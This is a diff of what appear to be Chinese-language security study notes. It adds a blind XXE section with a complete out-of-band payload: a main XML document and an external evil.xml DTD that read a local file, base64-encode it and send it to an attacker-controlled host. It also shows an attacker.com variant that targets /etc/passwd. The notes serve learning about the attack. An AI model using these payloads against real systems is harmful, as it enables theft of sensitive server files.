@@ -172,8 +172,58 @@ ftp://
         </creds>
         ```
         當看到 `&xxe;` 就去讀 `/etc/passwd `再把內容塞進來
+
 #### 實際攻擊
 XXE 不是 XML 漏洞。而是 XML parser 被允許解析 external entity，如果讀的檔案是個機敏資料，並且有機會顯示出來，那就會是漏洞
+
+#### Blind XXE
+有 XXE 漏洞但伺服器「沒有把讀到的資料回顯給你」
+* Payload
+    ```xml
+    <?xml version="1.0" encoding="utf-8"?>
+    <!DOCTYPE roottag [
+    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///path/to/file">
+    <!ENTITY % dtd SYSTEM "http://0.0.0.0:5000/evil.xml">
+    %dtd:
+    ]>
+
+    <roottag>&send;</roottag>
+    ```
+* evil.xml
+    ```xml
+    <?xml version="1.0" encoding="ISO-8859-1"?>
+    <!ENTITY % all "<!ENTITY send SYSTEM 'http://0.0.0.0:5000/?%file;'>">
+    %all;
+    ```
+這是一個<span style="background-color: yellow">標準 Blind XXE + 外部 DTD + OOB 外帶資料</span>的完整攻擊範例
+
+1. 送惡意 XML: 也就是主要payload，
+2. 伺服器讀取本地檔案: `%file` 利用php filter wrapper讀取 /path/to/file
+3. Base64 編碼
+4. 載入外部 DTD（evil.xml）: 因為執行到主要payload的`%dtd`變數
+5. evil.xml 建立新的 entity: 定義 `%all`並且`%file`會先展開
+6. 伺服器對攻擊者發 HTTP request
+7. 攻擊者收到檔案內容: 攻擊者的server log會看到`%file` → base64-encode(file:///path/to/file)
+
+#### 為什麼要分成兩段？
+因為：在 XML 規範中
+> 不能在內部 DTD 直接把 %file 放進 SYSTEM URL，很多 parser 會擋
+
+也就是不能
+```xml
+<!DOCTYPE roottag [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY send SYSTEM "http://attacker.com/?x=%file;">
+]>
+
+不會變成 → http://attacker.com/?x=(/etc/passwd內容)
+```
+我們的目的是要達到**字串拼接**並且把內容傳送出來，所以要：
+1. 在主 DTD 定義 %file
+2. 載入外部 DTD
+3. 在外部 DTD 裡組合 URL
+
+這樣才能成功。
 
 ### 其他
 * [LFI VS RFI](https://ithelp.ithome.com.tw/articles/10240486): LFI(Local File Inclusion)<br>產生的原因是程式設計師未檢查用戶輸入的參數，導致駭客可以讀取server上的敏感文件。開發人員可能貪圖方便，將GET或POST參數直接設定為檔案名稱，直接include該檔案進網頁裡，結果就造成了引入其他檔案，造成資訊洩漏<br><br>RFI(Remote File Include)<br>基本上與LFI概念一樣，只是include的file來源變成從外部引入，觸發條件必須要把php設定參數 `allow_url_include` 設定為 `ON`
